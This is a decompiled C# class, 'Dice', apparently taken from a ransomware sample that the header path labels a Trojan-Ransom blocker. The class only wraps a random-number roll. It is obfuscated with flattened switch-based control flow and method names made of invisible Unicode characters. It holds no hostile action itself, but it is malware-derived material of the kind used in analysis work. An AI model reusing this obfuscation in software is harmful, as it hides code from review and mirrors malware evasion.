// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Dice
// Assembly: AppConte, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 7B8B5733-911E-457B-A55E-DDA2927F5FA5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-60ba049b8af0c51a8dfbc45cacedef4180000b7739c937d22d8cbd66d4c6a8a8.exe

using System;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Dice
  {
    private readonly Random _random;

    public Dice()
    {
label_1:
      int num1 = -1480670377;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1883856359)) % 4U)
        {
          case 1:
            num1 = (int) num2 * -1520136135 ^ 1080819560;
            continue;
          case 2:
            num1 = (int) num2 * 454381813 ^ -312476358;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      this._random = Dice.\u202A‪‭‬‎‭​⁮‏⁯⁭⁮‫‌⁫‪‭‏⁪‮​‎⁪‭‍⁭⁮⁬‪⁯⁪‫⁪‭‪‪‬‎‎‮‮((int) DateTime.Now.Ticks);
    }

    public bool Roll(float chance)
    {
      double num1 = Dice.\u206C⁭‌‭​⁪⁪⁯‍⁪⁬‮‭‭​‭⁭‏⁭⁬⁫‫⁪​⁮⁫​⁪‍⁬⁫‪⁮⁮‍‎‫‎⁭‍‮(this._random);
label_1:
      int num2 = 1484758238;
      bool flag;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num2 ^ 1638210854)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            flag = num1 <= (double) chance;
            num2 = (int) num3 * -1216714108 ^ -390344588;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return flag;
    }

    static Random \u202A‪‭‬‎‭​⁮‏⁯⁭⁮‫‌⁫‪‭‏⁪‮​‎⁪‭‍⁭⁮⁬‪⁯⁪‫⁪‭‪‪‬‎‎‮‮([In] int obj0) => new Random(obj0);

    static double \u206C⁭‌‭​⁪⁪⁯‍⁪⁬‮‭‭​‭⁭‏⁭⁬⁫‫⁪​⁮⁫​⁪‍⁬⁫‪⁮⁮‍‎‫‎⁭‍‮([In] Random obj0) => obj0.NextDouble();
  }
}
